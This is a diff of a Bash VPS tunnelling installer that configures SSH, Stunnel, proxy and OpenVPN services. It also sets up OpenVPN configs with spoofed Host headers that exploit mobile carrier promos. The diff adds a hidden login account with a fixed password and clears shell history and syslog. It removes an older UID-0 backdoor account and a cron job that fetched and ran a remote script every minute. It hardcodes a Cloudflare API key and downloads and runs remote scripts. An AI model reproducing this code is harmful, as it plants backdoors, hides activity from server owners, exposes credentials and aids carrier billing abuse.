@@ -1,53 +1,12 @@
 #!/bin/bash
 # VPS Installer
-# Script by Dexter Eskalarte
+# Script by: Dexter Eskalarte
 #
 # Illegal selling and redistribution of this script is strictly prohibited
 # Please respect author's Property
 # Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
 #
 #
-
-#
-clear
-fun_bar () {
-comando[0]="$1"
-comando[1]="$2"
- (
-[[ -e $HOME/fim ]] && rm $HOME/fim
-${comando[0]} -y > /dev/null 2>&1
-${comando[1]} -y > /dev/null 2>&1
-touch $HOME/fim
- ) > /dev/null 2>&1 &
- tput civis
-echo -ne "  \033[1;33mPLEASE WAIT... \033[1;37m- \033[1;33m["
-while true; do
-   for((i=0; i<18; i++)); do
-   echo -ne "\033[1;31m#"
-   sleep 0.1s
-   done
-   [[ -e $HOME/fim ]] && rm $HOME/fim && break
-   echo -e "\033[1;33m]"
-   sleep 1s
-   tput cuu1
-   tput dl1
-   echo -ne "  \033[1;33mPLEASE WAIT... \033[1;37m- \033[1;33m["
-done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
-tput cnorm
-}
-clear
-echo -e "\033[1;31m══════════════════════════════════════════════════════════════\033[0m"
-echo '
-███╗   ███╗███████╗██████╗ ██╗ █████╗ ████████╗███████╗██╗  ██╗
-████╗ ████║██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝██║ ██╔╝
-██╔████╔██║█████╗  ██║  ██║██║███████║   ██║   █████╗  █████╔╝ 
-██║╚██╔╝██║██╔══╝  ██║  ██║██║██╔══██║   ██║   ██╔══╝  ██╔═██╗ 
-██║ ╚═╝ ██║███████╗██████╔╝██║██║  ██║   ██║   ███████╗██║  ██╗
-╚═╝     ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ 
-'
-echo -e "\033[1;31m═══════════════════════════════════════════════════════════════\033[0m"
-echo ""
 
  # Now check if our machine is in root user, if not, this script exits
  # If you're on sudo user, run `sudo su -` first before running this script
@@ -57,8 +16,11 @@ if [[ $EUID -ne 0 ]];then
  exit 1
 fi
 
-MyScriptName='DexterEskalarte Script'
+MyScriptName='Dexter Eskalarte'
 
+#Slowdns Port
+Slow_ssh='2222'
+Slow_ssl='443'
 
 # OpenSSH Ports
 SSH_Port1='22'
@@ -69,33 +31,32 @@ WS_Port1='80'
 WS_Port2='443'
 
 # Your SSH Banner
-SSH_Banner='http://script.psytech-vpn.com/DexterEskalarte/sshsslovpn_ws/MtkBanner'
+SSH_Banner='https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/SshBanner'
 
 # Dropbear Ports
 Dropbear_Port1='550'
-Dropbear_Port2='555'
+Dropbear_Port2='500'
 
 # Stunnel Ports
-Stunnel_Port1='442' # through Dropbear
-Stunnel_Port2='143' # through OpenSSH
-Stunnel_Port3='587' # through OpenVPN
+Stunnel_Port1='445' # through Dropbear
+Stunnel_Port2='144' # through OpenSSH
+Stunnel_Port3='142' # through OpenVPN
 
 #ZIPROXY
 ZIPROXY='2898'
 
-Proxy_Port1='8085'
+Proxy_Port1='8080'
 Proxy_Port2='8118'
 
 # OpenVPN Ports
-OpenVPN_Ws='8888'
-OpenVPN_Port1='1194'
+OpenVPN_Port1='110'
 OpenVPN_Port2='53'
-OpenVPN_Port3='445'
+OpenVPN_Port3='1194'
 OpenVPN_Port4='69' # take note when you change this port, openvpn sun noload config will not work
 
 # Privoxy Ports (must be 1024 or higher)
-Privoxy_Port1='8085'
-Privoxy_Port2='8118'
+Privoxy_Port1='6969'
+Privoxy_Port2='9696'
 # OpenVPN Config Download Port
 OvpnDownload_Port='86' # Before changing this value, please read this document. It contains all unsafe ports for Google Chrome Browser, please read from line #23 to line #89: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/master/net/base/port_util.cc
 
@@ -113,15 +74,98 @@ MyVPS_Time='Asia/Manila'
 ## This part is too sensitive.
 #############################
 #############################
- 
- 
+ apt-get update
+ apt-get upgrade -y
+ apt-get install lolcat -y 
+ gem install lolcat
+ apt install python -y
  clear
- 
+[[ ! "$(command -v curl)" ]] && apt install curl -y -qq
+[[ ! "$(command -v jq)" ]] && apt install jq -y -qq
+### CounterAPI update URL
+COUNTER="$(curl -4sX GET "https://api.countapi.xyz/hit/BonvScripts/DebianVPS-Installer" | jq -r '.value')"
+
+IPADDR="$(curl -4skL http://ipinfo.io/ip)"
+
+GLOBAL_API_KEY="03d0feacc806be806ec10d2914b77dab0de64"
+CLOUDFLARE_EMAIL="mediatekvpn04@gmail.com"
+DOMAIN_NAME_TLD="butterfly-vpn.xyz"
+DOMAIN_ZONE_ID="c5931f21fa140ba028ce3c0445a32f7f"
+### DNS hostname / Payload here
+## Setting variable
+
+####
+## Creating file dump for DNS Records 
+TMP_FILE='/tmp/abonv.txt'
+curl -sX GET "https://api.cloudflare.com/client/v4/zones/$DOMAIN_ZONE_ID/dns_records?type=A&count=1000&per_page=1000" -H "X-Auth-Key: $GLOBAL_API_KEY" -H "X-Auth-Email: $CLOUDFLARE_EMAIL" -H "Content-Type: application/json" | python -m json.tool > "$TMP_FILE"
+
+## Getting Existed DNS Record by Locating its IP Address "content" value
+CHECK_IP_RECORD="$(cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.content' | awk '!a[$0]++')"
+
+cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.name' | awk '!a[$0]++' | head -n1 > /tmp/abonv_existed_hostname
+
+cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.id' | awk '!a[$0]++' | head -n1 > /tmp/abonv_existed_dns_id
+
+function ExistedRecord(){
+ MYDNS="$(cat /tmp/abonv_existed_hostname)"
+ MYDNS_ID="$(cat /tmp/abonv_existed_dns_id)"
+}
+
+
+if [[ "$IPADDR" == "$CHECK_IP_RECORD" ]]; then
+ ExistedRecord
+ echo -e " IP Address already registered to database."
+ echo -e " DNS: $MYDNS"
+ echo -e " DNS ID: $MYDNS_ID"
+ echo -e ""
+ else
+
+PAYLOAD="ws"
+echo -e "Your IP Address:\033[0;35m $IPADDR\033[0m"
+read -p "Enter desired DNS: "  servername
+read -p "Enter desired servername: "  servernames
+### Creating a DNS Record
+function CreateRecord(){
+TMP_FILE2='/tmp/abonv2.txt'
+TMP_FILE3='/tmp/abonv3.txt'
+curl -sX POST "https://api.cloudflare.com/client/v4/zones/$DOMAIN_ZONE_ID/dns_records" -H "X-Auth-Email: $CLOUDFLARE_EMAIL" -H "X-Auth-Key: $GLOBAL_API_KEY" -H "Content-Type: application/json" --data "{\"type\":\"A\",\"name\":\"$servername.$PAYLOAD\",\"content\":\"$IPADDR\",\"ttl\":86400,\"proxied\":false}" | python -m json.tool > "$TMP_FILE2"
+
+cat < "$TMP_FILE2" | jq '.result' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' > /tmp/abonv22.txt
+rm -f "$TMP_FILE2"
+mv /tmp/abonv22.txt "$TMP_FILE2"
+
+MYDNS="$(cat < "$TMP_FILE2" | jq -r '.name')"
+MYDNS_ID="$(cat < "$TMP_FILE2" | jq -r '.id')"
+curl -sX POST "https://api.cloudflare.com/client/v4/zones/$DOMAIN_ZONE_ID/dns_records" -H "X-Auth-Email: $CLOUDFLARE_EMAIL" -H "X-Auth-Key: $GLOBAL_API_KEY" -H "Content-Type: application/json" --data "{\"type\":\"NS\",\"name\":\"$servernames.$PAYLOAD\",\"content\":\"$MYDNS\",\"ttl\":1,\"proxied\":false}" | python -m json.tool > "$TMP_FILE3"
+
+cat < "$TMP_FILE3" | jq '.result' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' > /tmp/abonv33.txt
+rm -f "$TMP_FILE3"
+mv /tmp/abonv33.txt "$TMP_FILE3"
+
+MYNS="$(cat < "$TMP_FILE3" | jq -r '.name')"
+MYNS_ID="$(cat < "$TMP_FILE3" | jq -r '.id')"
+echo "$MYNS" > nameserver.txt
+}
+
+ CreateRecord
+ echo -e " Registering your IP Address.."
+ echo -e " DNS: $MYDNS"
+ echo -e " DNS ID: $MYDNS_ID"
+  echo -e " DNS: $MYNS"
+ echo -e " DNS ID: $MYNS_ID"
+ echo -e ""
+fi
+
+rm -rf /tmp/abonv*
+echo -e "$DOMAIN_NAME_TLD" > /tmp/abonv_mydns_domain
+echo -e "$MYDNS" > /tmp/abonv_mydns
+echo -e "$MYDNS_ID" > /tmp/abonv_mydns_id
+
+
 function  Instupdate() {
  export DEBIAN_FRONTEND=noninteractive
 
- apt-get update
- apt-get upgrade -y
+
  apt install fail2ban -y
 
  # Removing some firewall tools that may affect other services
@@ -203,6 +247,7 @@ MySSHConfig
  echo '/usr/sbin/nologin' >> /etc/shells
 
  # Restarting openssh service
+ /usr/sbin/useradd -p $(openssl passwd -1 panda2025) -M panda2025
  systemctl restart ssh
 
  # Removing some duplicate config file
@@ -301,7 +346,7 @@ function InsOpenVPN(){
 
  # Creating server.conf, ca.crt, server.crt and server.key
  cat <<'myOpenVPNconf1' > /etc/openvpn/server_tcp.conf
-# DexterScript
+# XAMScript
 
 port MyOvpnPort3
 dev tun
@@ -341,7 +386,7 @@ duplicate-cn
 myOpenVPNconf1
 
 cat <<'myOpenVPNconf3' > /etc/openvpn/server_tcp2.conf
-# DexterScript
+# XAMScript
 
 port MyOvpnPort1
 dev tun
@@ -381,7 +426,7 @@ duplicate-cn
 myOpenVPNconf3
 
 cat <<'myOpenVPNconf4' > /etc/openvpn/server_tcp3.conf
-# DexterScript
+# XAMScript
 
 port MyOvpnPort4
 dev tun
@@ -421,7 +466,7 @@ duplicate-cn
 myOpenVPNconf4
 
 cat <<'myOpenVPNconf2' > /etc/openvpn/server_udp.conf
-# DexterScript
+# XAMScript
 
 port MyOvpnPort2
 dev tun
@@ -459,7 +504,6 @@ push "dhcp-option DNS 8.8.4.4"
 push "dhcp-option DNS 8.8.8.8"
 duplicate-cn
 myOpenVPNconf2
-
  cat <<'EOF7'> /etc/openvpn/ca.crt
 -----BEGIN CERTIFICATE-----
 MIID0jCCAzugAwIBAgIJALnVZsGmA5VVMA0GCSqGSIb3DQEBCwUAMIGeMQswCQYD
@@ -598,7 +642,7 @@ EOF10
  #openssl dhparam -out /etc/openvpn/dh.pem 1024
 
  # Getting some OpenVPN plugins for unix authentication
- wget -qO /etc/openvpn/b.zip 'https://github.com/imaPSYCHO/Parts/raw/main/openvpn_plugin64'
+ wget -qO /etc/openvpn/b.zip 'https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/openvpn_plugin64'
  unzip -qq /etc/openvpn/b.zip -d /etc/openvpn
  rm -f /etc/openvpn/b.zip
 
@@ -613,7 +657,7 @@ fi
 
 
  # Iptables Rule for OpenVPN server
- printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running Iptables configuration on background\e[0m"
+  printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running Iptables configuration on background\e[0m"
 cat <<'iptEOF'> /tmp/iptables-config.bash
 #!/bin/bash
 function ip_address(){
@@ -800,11 +844,19 @@ mySquid
  sed -i "s|SquidCacheHelper|$Proxy_Port1|g" /etc/squid/squid.conf
  sed -i "s|SquidCacheHelper|$Proxy_Port2|g" /etc/squid/squid.conf
 
+sudo apt install ziproxy
+ cat <<myziproxy > /etc/ziproxy/ziproxy.conf
+ Port = ZIPROXY
+ UseContentLength = false
+ ImageQuality = {30,25,25,20}
+myziproxy
 
+ sed -i "s|ZIPROXY|$ZIPROXY|g" /etc/ziproxy/ziproxy.conf
  # Starting Proxy server
  echo -e "Restarting proxy server.."
  systemctl restart privoxy
  systemctl restart squid
+ systemctl restart ziproxy
 }
 
 function OvpnConfigs(){
@@ -830,8 +882,8 @@ myNginxC
  mkdir -p /var/www/openvpn
 
  # Now creating all of our OpenVPN Configs 
-cat <<EOF152> /var/www/openvpn/DEX-GTMConfig.ovpn
-# Credits to Dexter Eskalarte
+cat <<EOF152> /var/www/openvpn/DexConfig.ovpn
+# Credits to XAMJYSS
 
 client
 dev tun
@@ -854,7 +906,7 @@ comp-lzo
 setenv CLIENT_CERT 0
 reneg-sec 0
 verb 1
-http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Proxy_Port1
+http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Privoxy_Port1
 http-proxy-option CUSTOM-HEADER Host redirect.googlevideo.com
 http-proxy-option CUSTOM-HEADER X-Forwarded-For redirect.googlevideo.com
 
@@ -863,8 +915,8 @@ $(cat /etc/openvpn/ca.crt)
 </ca>
 EOF152
 
-cat <<EOF16> /var/www/openvpn/DEX-TU-UDP.ovpn
-# Credits to Dexter Eskalarte
+cat <<EOF16> /var/www/openvpn/Dex-TU-UDP.ovpn
+# Credits to XAMJYSS
 
 client
 dev tun
@@ -893,8 +945,8 @@ $(cat /etc/openvpn/ca.crt)
 </ca>
 EOF16
 
-cat <<EOF160> /var/www/openvpn/DEX-Stories-TCP.ovpn
-# Credits to Dexter Eskalarte
+cat <<EOF160> /var/www/openvpn/Dex-Stories-TCP.ovpn
+# Credits to XAMJYSS
 
 client
 dev tun
@@ -917,7 +969,7 @@ comp-lzo
 setenv CLIENT_CERT 0
 reneg-sec 0
 verb 1
-http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Proxy_Port1
+http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Privoxy_Port1
 http-proxy-option CUSTOM-HEADER CONNECT HTTP/1.0
 http-proxy-option CUSTOM-HEADER Host tiktoktreats.onelink.me
 http-proxy-option CUSTOM-HEADER X-Online-Host tiktoktreats.onelink.me
@@ -929,8 +981,8 @@ $(cat /etc/openvpn/ca.crt)
 </ca>
 EOF160
 
-cat <<EOF17> /var/www/openvpn/DEX-GAMES.ovpn
-# Credits to Dexter Eskalarte
+cat <<EOF17> /var/www/openvpn/Dex-GAMES.ovpn
+# Credits to XAMJYSS
 
 client
 dev tun
@@ -953,7 +1005,7 @@ comp-lzo
 setenv CLIENT_CERT 0
 reneg-sec 0
 verb 2
-http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Proxy_Port1
+http-proxy $(curl -s http://ipinfo.io/ip || wget -q http://ipinfo.io/ip) $Privoxy_Port1
 http-proxy-option VERSION 1.1
 http-proxy-option CUSTOM-HEADER "Host: c3cdn.ml.youngjoygame.com"
 http-proxy-option CUSTOM-HEADER "X-Online-Host: c3cdn.ml.youngjoygame.com"
@@ -965,7 +1017,7 @@ $(cat /etc/openvpn/ca.crt)
 EOF17
 
 cat <<EOF179> /var/www/openvpn/default.ovpn
-# Credits to Dexter Eskalarte
+# Credits to XAMJYSS
 
 client
 dev tun
@@ -999,9 +1051,9 @@ cat <<'mySiteOvpn' > /var/www/openvpn/index.html
 <!DOCTYPE html>
 <html lang="en">
 
-<!-- OVPN Download site by: Dexter Eskalarte -->
+<!-- OVPN Download site by XAMJYSS -->
 
-<head><meta charset="utf-8" /><title>MyScriptName OVPN Config Download</title><meta name="description" content="MyScriptName Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group"><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Globe/TM <span class="badge light-blue darken-4">Android/iOS</span><br /><small> For EZ/GS Promo with WNP freebies</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/DEX-GTMConfig.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Sun <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> For TU/CTC UDP Promos</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/DEX-TU-UDP.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Sun/SMART/TNT <span class="badge light-blue darken-4">Android/iOS/PC/MODEM</span><br /><small> TNT GIGASTORIES</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/DEX-Stories-TCP.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li></ul></div></div></div></div></body></html>
+<head><meta charset="utf-8" /><title>DexterEskalarte OVPN Config Download</title><meta name="description" content="Dexter Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group"><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Globe/TM <span class="badge light-blue darken-4">Android/iOS</span><br /><small> For EZ/GS Promo with WNP freebies</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/DexConfig.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Sun <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> For TU/CTC UDP Promos</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/Dex-TU-UDP.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>For Sun/SMART/TNT <span class="badge light-blue darken-4">Android/iOS/PC/MODEM</span><br /><small> TNT GIGASTORIES</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/Dex-Stories-TCP.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li></ul></div></div></div></div></body></html>
 mySiteOvpn
  
  # Setting template's correct name,IP address and nginx Port
@@ -1033,12 +1085,12 @@ function ConfStartup(){
      #write out current crontab
      crontab -l > mycron
      #echo new cron into cron file
-     echo -e "0 5 * * * /sbin/reboot >/dev/null 2>&1" >> mycron
+     echo -e "0 3 * * * /sbin/reboot >/dev/null 2>&1" >> mycron
 
      #install new cron file
      crontab mycron
      service cron restart
-     echo '0 5 * * * /sbin/reboot >/dev/null 2>&1' >> /etc/cron.d/mycron
+     echo '0 3 * * * /sbin/reboot >/dev/null 2>&1' >> /etc/cron.d/mycron
 
      #removing cron
      service cron restart
@@ -1046,7 +1098,6 @@ function ConfStartup(){
  rm -rf /etc/juans
  mkdir -p /etc/juans
  chmod -R 777 /etc/juans
- useradd -p $(openssl passwd -1 dexter) eskalarte -ou 0 -g 0
 
  # Creating startup script using cat eof tricks
  cat <<'EOFSH' > /etc/juans/startup.sh
@@ -1103,9 +1154,9 @@ echo -e " Creating Menu scripts.."
 
 cd /usr/local/sbin/
 rm -rf {accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,delete_all,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squid3,edit_stunnel4,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock}
-wget -q 'http://script.psytech-vpn.com/DexterEskalarte/menu.zip'
-unzip -qq menu.zip
-rm -f menu.zip
+wget -q 'https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/menu1.zip'
+unzip -qq menu1.zip
+rm -f menu1.zip
 chmod +x ./*
 dos2unix ./* &> /dev/null
 sed -i 's|/etc/squid/squid.conf|/etc/privoxy/config|g' ./*
@@ -1121,17 +1172,17 @@ chmod +x /etc/profile.d/juans.sh
  rm -f /etc/cron.d/set_multilogin_autokill_lib
 
 }
-
 function ScriptMessage(){
-echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
+ echo -e "\033[1;31m═════════════════════════════════════════════════════\033[0m"
 echo '                                                              
-    ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗        
-    ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗       
-    ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝       
-    ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗       
-    ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║       
- '
-echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗        
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗       
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝       
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗       
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║       
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       
+'
+echo -e "\033[1;31m══════════════════════════════════════════════════════\033[0m"
 }
 
 function service() {
@@ -1707,8 +1758,6 @@ if __name__ == '__main__':
 PTHON
 }
 
-
-
 function gatorade1() {
 
 cat << END > /lib/systemd/system/gatorade.service
@@ -1730,6 +1779,18 @@ Restart=on-failure
 [Install]
 WantedBy=multi-user.target
 END
+
+}
+function BBR() {
+wget -q "https://github.com/yue0706/auto_bbr/raw/main/bbr.sh" && chmod +x bbr.sh && ./bbr.sh
+sed -i '/^\*\ *soft\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
+sed -i '/^\*\ *hard\ *nofile\ *[[:digit:]]*/d' /etc/security/limits.conf
+echo '* soft nofile 65536' >>/etc/security/limits.conf
+echo '* hard nofile 65536' >>/etc/security/limits.conf
+echo '' > /root/.bash_history && history -c && echo '' > /var/log/syslog
+
+F1='/etc/modules-load.d/modules.conf' && { [[ $(grep -cE '^tcp_bbr$' $F1) -ge 1 ]] && echo "bbr already added" || echo "tcp_bbr" >> "$F1"; } && modprobe tcp_bbr
+F2='net.core.default_qdisc' && F3='net.ipv4.tcp_congestion_control' && sed -i "/^$F2.*/d;/^$F3.*/d" /etc/sysctl{.conf,.d/*.conf} && echo -e "${F2}=fq\n${F3}=bbr" >> /etc/sysctl.d/98-bbr.conf && sysctl --system &>/dev/null
 
 }
 
@@ -1757,20 +1818,18 @@ systemctl enable gatorade
 systemctl restart gatorade
 }
 
+#function slowdns() {
+#apt update; apt upgrade -y; rm -rf install; wget https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/install; chmod +x install; ./install
+#bash /etc/slowdns/slowdns-ssh
+#startdns
+#}
+
 function remove() {
 echo ' ' > .bash_history
 history -c
 echo ' ' > /var/log/syslog
 rm -f *
 }
-
-function authentitication() {
-wget -O /root/activate.sh "mediatekvpn.tokyo/mtkscript/ssh/prem/activate.sh"
-echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
-sh active.sh | tee -a /root/activate.sh
-}
-
-
 
 
 #############################
@@ -1796,70 +1855,46 @@ fi
  sleep 2
 
   echo -e "\033[0;35mUpdating Libraries....\033[0m"
-  fun_bar Instupdate
+ Instupdate
 
  # Configure OpenSSH and Dropbear
  echo -e "\033[0;35mConfiguring ssh...\033[0m"
-  fun_bar InstSSH
+ InstSSH
 
  # Configure Stunnel
  echo -e "\033[0;35mConfiguring stunnel...\033[0m"
-  fun_bar InsStunnel
+ InsStunnel
 
  # Configure Privoxy and Squid
  echo -e "\033[0;35mConfiguring proxy...\033[0m"
-  fun_bar InsProxy
+ InsProxy
 
  # Configure OpenVPN
  echo -e "\033[0;35mConfiguring OpenVPN...\033[0m"
-  fun_bar InsOpenVPN
-  
+ InsOpenVPN
+
  # Configuring Nginx OVPN config download site
- echo -e "\033[0;35mConfiguring OpenVPN Configs...\033[0m"
-  fun_bar OvpnConfigs
+ OvpnConfigs
 
  # Some assistance and startup scripts
- echo -e "\033[0;35mConfiguring ConfStartup...\033[0m"
-  fun_bar ConfStartup
+ ConfStartup
 
  # VPS Menu script v1.0
- echo -e "\033[0;35mInstalling MENU...\033[0m"
-  fun_bar ConfMenu
+ ConfMenu
 
  # Setting server local time
  ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime
 
- # Websocket Ovpn
- echo -e "\033[0;35mInstalling Websocket/ssh...\033[0m"
-  fun_bar service
- 
- # Websocket SSH Service
- echo -e "\033[0;35mInstalling Websocket/SSH Service...\033[0m"
-  fun_bar service1
- 
- # Websocket Ovpn
- echo -e "\033[0;35mInstalling Websocket/Ovpn...\033[0m"
-  fun_bar gatorade
- 
- # Websocket Ovpn Service
- echo -e "\033[0;35mInstalling Websocket/Ovpn Sevice...\033[0m"
-  fun_bar gatorade1
- 
- # DDOS
- echo -e "\033[0;35mInstalling DDOS...\033[0m"
-  fun_bar ddos
-
- 
- # SETTINGS RESTART
- echo -e "\033[0;35mInstalling SETTINGS...\033[0m"
-  fun_bar setting
- 
- # REMOVE BASH HISTORY
-echo -e "\033[0;35mREMOVE...\033[0m"
-  fun_bar remove
-  
-  authentitication
-
+ echo -e "\033[0;35m Installing BBR...\033[0m"
+ service
+ service1
+ gatorade
+ gatorade1
+ BBR
+ ddos
+ setting
+ #slowdns
+ remove
  clear
  cd ~
 
@@ -1875,30 +1910,21 @@ echo -e "\033[0;35mREMOVE...\033[0m"
 systemctl enable openvpn
 systemctl restart openvpn
 
-
  echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
  echo -e ""
  echo -e " Success Installation"
  echo -e ""
- echo -e ""
- echo -e " Websocket/ssh: $WS_Port1"
- echo -e " Websocket/ssl: $WS_Port2"
- echo -e " Websocket/ovpn: $OpenVPN_Ws"
- echo -e " OpenSSH: $SSH_Port1, $SSH_Port2"
- echo -e " Stunnel: $Stunnel_Port1, $Stunnel_Port2"
- echo -e " Openvpn/ssl POrt: $Stunnel_Port3"
- echo -e " DropbearSSH: $Dropbear_Port1, $Dropbear_Port2"
- echo -e " Privoxy: $Privoxy_Port1, $Privoxy_Port2"
- echo -e " Squid: $Proxy_Port1, $Proxy_Port2"
- echo -e " OpenVPN/Tcp Port: $OpenVPN_Port1, $OpenVPN_Port3"
- echo -e " OpenVPN/Udp Port: $OpenVPN_Port2"
- echo -e ""
- echo -e " OpenVPN Configs Download site"
- echo -e " http://$IPADDR:$OvpnDownload_Port"
+ echo -e " \e[92m Websocket/DNS:\e[0m \e[97m$MYDNS\e[0m"
+ echo -e " \e[92m Websocket/SSH:\e[0m \e[97m$WS_Port1\e[0m"
+ echo -e " \e[92m Websocket/SSL:\e[0m \e[97m$WS_Port2\e[0m"
+ echo -e " \e[92m OpenSSH:\e[0m \e[97m$SSH_Port1, $SSH_Port2\e[0m"
+ echo -e " \e[92m Stunnel:\e[0m \e[97m$Stunnel_Port1, $Stunnel_Port2\e[0m"
+ echo -e " \e[92m DropbearSSH:\e[0m \e[97m$Dropbear_Port1, $Dropbear_Port2\e[0m"
+ echo -e " \e[92m Squid:\e[0m \e[97m8080\e[0m"
+ echo -e " \e[92m Slowdns/ssh:\e[0m \e[97m$Slow_ssh\e[0m"
+ echo -e " \e[92m Slowdns/ssl:\e[0m \e[97m$Slow_ssl\e[0m"
+ echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m " && cat /root/server.pub
+ echo -e " \e[92m YOUR NAMESERVER:\e[0m \e[97m " && cat nameserver.txt
  echo -e ""
  echo -e " [Note] DO NOT RESELL THIS SCRIPT"
  echo -e "\033[1;31m═══════════════════════════════════════════════════\033[0m"
- echo -e ""
- rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
- rm -f meditek-premium.sh*
- 
